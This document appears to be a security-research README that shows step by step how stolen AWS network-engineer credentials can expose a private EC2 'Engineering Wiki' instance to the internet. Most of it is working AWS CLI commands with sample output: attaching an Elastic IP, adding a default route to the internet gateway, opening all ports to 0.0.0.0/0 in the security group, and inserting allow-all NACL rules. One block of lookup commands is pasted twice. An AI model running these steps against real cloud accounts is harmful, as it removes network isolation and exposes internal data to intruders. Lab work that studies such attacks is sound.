# VPC Attacking 
Scenario Overview

This project documents a security research scenario where an attacker has obtained credentials belonging to a Network Engineer.

The primary target is an internal asset: an EC2 instance. This instance is located within a Private Subnet, hosting internal documentation on port 80. In this architecture, the instance is intentionally isolated from the internet, relying on network-level barriers rather than host-based hardening.

## The Objective

The goal is to demonstrate how a compromised identity with network-level permissions can be used to re-engineer the VPC infrastructure. We will bypass existing isolation to expose the internal instance to the public internet, allowing for remote data access.

## Execution Roadmap

To bridge the gap between our external environment and the isolated "Engineering Wiki," we perform a multi-stage network bypass:

* Public IP Attribution: Assigning a reachable public address to the internal instance to enable external communication.

* Route Hijacking: Modifying the Route Tables associated with the private subnet. We add a Default Route (0.0.0.0/0) pointing to the Internet Gateway (IGW), essentially creating a path out of the private network.

* Security Group Perforation: Using the authorize-security-group-ingress command to allow inbound traffic through the instance-level stateful firewall.

* Network ACL Bypass: Reconfiguring the Network Access Control Lists (NACLs) to ensure the subnet's stateless gatekeeper allows both inbound and outbound traffic flows.


## How to assign a public static IP address on an EC2 instance

```bash
aws ec2 allocate-address
```
This command creates and allocates a public, static IP address for your AWS account.

```json
{
    "AllocationId": "eipalloc-***",
    "PublicIpv4Pool": "amazon",
    "NetworkBorderGroup": "us-east-1",
    "Domain": "vpc",
    "PublicIp": "203.0.113.50"
}
```

You will need to find the ENI Id for the specific EC2 instance to which you want to attach the new public IP allocated to your AWS account.

```bash
aws ec2 describe-instances | grep eni
```

```json
  "AttachmentId":"eni-attach-0d8fb7g36c604fccd",            "NetworkInterfaceId":"eni-0jl4503a19c6c6e50",
``` 

Now you can attach the public IP to the ENI

```bash
 aws ec2 associate-address --network-interface-id eni-0jl4503a19c6c6e50 --allocation-id eipalloc-***
 ```


## Allowing Internet access 
The instance already has a public address, but it still cannot be accessed over the internet because there is no internet route to the instance.

To do this, you will need an IGW and a Route Table.

* IGW (Internet Gateway):

```bash
aws ec2 describe-internet-gateways
```
```json
 "InternetGatewayId": "igw-03808dghlk574696",
 ``` 

 * Route Table:
```bash
aws ec2 describe-route-tables
 ``` 
```json 
"RouteTableId": "rtb-09l189586f45ac2z1",
```

Adding the new route to the Route Table:
```bash
aws ec2 create-route --route-table-id rtb-09l189586f45ac2z1 --destination-cidr-block 0.0.0.0/0 --gateway-id igw-03808dghlk574696
```

`--destination-cidr-block 0.0.0.0/0` The Route Table will send all traffic to the IGW. 


You can see the new route with this command: 
```bash
aws ec2 describe-route-tables
 ```

```json
{
    "DestinationCidrBlock": "0.0.0.0/0",
    "GatewayId": "igw-03808dghlk574696",
    "Origin": "CreateRoute",
    "State": "active"
},
```

--- 

## Modifying the Security Group 
The traffic is still blocked by a security group. You can bypass this modifying the security group associated with the instace. 

```bash
aws ec2 describe-instances
```
With this command, you will find the security group associated with the instance.

```json
...
"GroupId": "sg-130487456f44f92df",
"GroupName": "Security Engineer Group"
...
``` 

```bash
aws ec2 authorize-security-group-ingress  --protocol all --port 0-65535 --cidr 0.0.0.0/0 --group-id sg-130487456f44f92df
```

This command is creating a new rule to allow all traffic from everywhere

---
## Bypassing NACLs 

With these commands, you can find the NACL associated with the instance.

```bash
aws ec2 describe-instances \
    --filters "Name=tag:Name,Values=Security Engineer Instance " \
    --query "Reservations[*].Instances[*].SubnetId" \
    --output text
``` 
```json
   "SubnetId": "subnet-0g24l198z4efe9926"
``` 
--- 

```bash
aws ec2 describe-network-acls \
    --filters "Name=association.subnet-id,Values=subnet-0g24l198z4efe9926" \
    --query "NetworkAcls[*].NetworkAclId" \
    --output text
```

```json
 "NetworkAclId": "acl-02fd7f51l7f687f9",
 ``` With these commands, you can find the NACL associated with the instance.

```bash
aws ec2 describe-instances \
    --filters "Name=tag:Name,Values=Security Engineer Instance " \
    --query "Reservations[*].Instances[*].SubnetId" \
    --output text
``` 
```json
   "SubnetId": "subnet-0g24l198z4efe9926"
``` 
--- 

```bash
aws ec2 describe-network-acls \
    --filters "Name=association.subnet-id,Values=subnet-0g24l198z4efe9926" \
    --query "NetworkAcls[*].NetworkAclId" \
    --output text
```

```json
 "NetworkAclId": "acl-02fd7f51l7f687f9",
 ``` 


Task: Neutralizing Network ACLs (The Perimeter Defense)

Even with the Route Table and Security Groups configured, the Network ACL (NACL) acts as a final gatekeeper at the subnet level. By default, this private subnet was configured to only trust internal traffic within the VPC CIDR (10.100.0.0/21).

1. Understanding the Barrier

```json
         "Entries": [
                {
                    "CidrBlock": "10.100.0.0/21",
                    "Egress": true,
                    "Protocol": "-1",
                    "RuleAction": "allow",
                    "RuleNumber": 100
                },
                {
                    "CidrBlock": "0.0.0.0/0",
                    "Egress": true,
                    "Protocol": "-1",
                    "RuleAction": "deny",
                    "RuleNumber": 32767
                },
                {
                    "CidrBlock": "10.100.0.0/21",
                    "Egress": false,
                    "Protocol": "-1",
                    "RuleAction": "allow",
                    "RuleNumber": 100
                },
                {
                    "CidrBlock": "172.18.0.0/16",
                    "Egress": false,
                    "PortRange": {
                        "From": 22,
                        "To": 443
                    },
                    "Protocol": "6",
                    "RuleAction": "allow",
                    "RuleNumber": 200
                },
                {
                    "CidrBlock": "0.0.0.0/0",
                    "Egress": false,
                    "Protocol": "-1",
                    "RuleAction": "deny",
                    "RuleNumber": 32767
                }
         ]
```

NACLs process rules in numerical order, starting from the lowest number. The default "Catch-all" rule (Rule 32767) is a hard DENY, meaning any traffic not explicitly allowed is dropped.

We need to insert a rule at the very top of the list (Rule 1) to ensure it's evaluated first. This command allows all incoming traffic from any source:

```bash
aws ec2 create-network-acl-entry \
    --cidr-block 0.0.0.0/0 \
    --ingress \
    --protocol -1 \
    --rule-action allow \
    --rule-number 1 \
    --network-acl-id acl-02fd7f51l7f687f9
```
 

Unlike Security Groups, if you allow a packet IN, the NACL does not automatically allow the response to go OUT.

To receive data back from the we must manually create an outbound (egress) rule.

```bash
aws ec2 create-network-acl-entry \
    --cidr-block 0.0.0.0/0 \
    --egress \
    --protocol -1 \
    --rule-action allow \
    --rule-number 1 \
    --network-acl-id acl-02fd7f51l7f687f9
``` 

At this point, a ping or curl to the instance's Public IP should succeed, as we have successfully dismantled the routing, firewall, and NACL barriers.